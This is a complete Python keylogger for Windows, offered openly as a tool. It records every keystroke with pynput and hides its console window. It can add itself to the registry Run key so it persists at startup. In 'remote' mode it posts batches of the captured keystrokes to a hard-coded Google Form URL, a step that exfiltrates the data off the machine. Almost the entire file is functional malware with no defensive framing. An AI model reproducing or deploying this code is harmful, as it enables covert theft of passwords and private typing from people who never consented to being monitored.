import os
import sys
import threading
import urllib,urllib3
import urllib.request
import smtplib
import ftplib
import datetime,time

from pynput.keyboard import Key, Listener
import logging

#Disallowing Multiple Instance
import win32event, win32api, winerror
from winreg import *
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple Instance not Allowed")
    exit(0)


x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print("""\n
        usage:main.py mode [optional:startup]
        mode:
            local: store the logs in a file [keylogs.txt]     
            remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script. """)
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True

#Remote Google Form logs post
def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfl08hwL-Kv0pRfhmeaJWWA5sOK8C1psyClLR4gJlLYt-SY5w/formResponse" #Specify Google Form URL here
        klog={'entry.366340186':data} #Specify the Field Name here
        try:
            dataenc=urllib.parse.urlencode(klog).encode("utf-8")
            req=urllib.request.Request(url)
            response=urllib.request.urlopen(req, data=dataenc)
            data=''
        except Exception as e:
            print(e)
    return True
 
def main():
    global x
    if len(sys.argv)==1:
        msg()
        exit(0)
    else:
        if sys.argv[1]=="local":
            x=1
            hide()
        elif sys.argv[1]=="remote":
            x=2
            hide() 
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main() 

def on_press(key):
    global x,data
    if(str(key).lower()=="key.esc") :
        return False
    data = data + str(key)
    if x==1:  
        local()
    elif x==2:
        remote() 

with Listener(on_press=on_press) as listener:
    listener.join()

    # data=data+keys 
 